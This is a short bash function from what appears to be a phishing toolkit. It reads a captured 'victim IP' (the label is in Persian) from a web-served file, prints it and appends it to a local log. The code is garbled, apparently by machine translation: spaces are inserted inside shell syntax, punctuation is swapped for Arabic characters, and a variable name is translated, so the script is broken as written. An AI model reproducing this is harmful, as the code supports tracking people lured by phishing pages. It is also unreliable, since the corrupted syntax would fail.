grab_ip () {

ip = $ (grep -a 'IP:' .htr/www/ip.txt | cut -d "" -f2 | tr -d '\ r')
IFS = $ '\ n'

printf "\ e [0m \ n"
printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m IP قربانی: \ e [0m \ e [1؛ 96m٪٪ s \ e [0m \ n "$ ip
printf "\ e [0m \ n"
printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ذخیره شده: \ e [0m \ e [ 1 ؛ 93m ip.txt \ e [0m \ n "$ سرور
printf "\ n"
cat .htr/www/ip.txt >> ip.txt

}

